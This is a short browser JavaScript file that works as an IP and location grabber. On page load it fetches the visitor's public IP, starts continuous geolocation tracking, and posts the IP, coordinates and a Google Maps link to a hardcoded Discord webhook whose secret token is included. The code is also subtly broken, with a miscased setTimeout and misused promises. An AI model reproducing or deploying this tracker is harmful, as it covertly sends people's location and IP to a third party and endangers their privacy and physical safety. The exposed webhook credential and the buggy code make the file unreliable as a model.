function discord_msg(mesage) {
    fetch("https://discordapp.com/api/webhooks/1314333297173856328/cUtaTn4ds-wtmXm1BUIlGFzRg_eSVpKtNa3tchU00AjmC2PvlQWG9TlJ0d4_vTPOgQYQ", {
        body: JSON.stringify({
          content: mesage,
        }),
        headers: {
          "Content-Type": "application/json",
        },
        method: "POST",
      })
        .then(function (res) {
          console.log(res);
        })
        .catch(function (res) {
          console.log(res);
        });
};

async function get_ip() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        discord_msg(data.ip, "       go to https://www.iplocation.net/ip-lookup to search ip") }
        catch (error) {
        console.error('Error fetching IP address:', error);
    }
};

async function get_location() {
    dosomething = navigator.geolocation.watchPosition((position) => {
        discord_msg("ip: " + get_ip())
        discord_msg("latitude: " + position.coords.latitude + " longitude: " + position.coords.longitude);
        discord_msg("https://www.google.no/maps/@" + position.coords.latitude + "," + position.coords.longitude + "m/");

      });
};
 
window.SetTimeOut(get_location(), 2000)

get_ip()
get_ip()
get_ip()
get_ip()
get_ip()
get_ip()
discord_msg(get_ip)
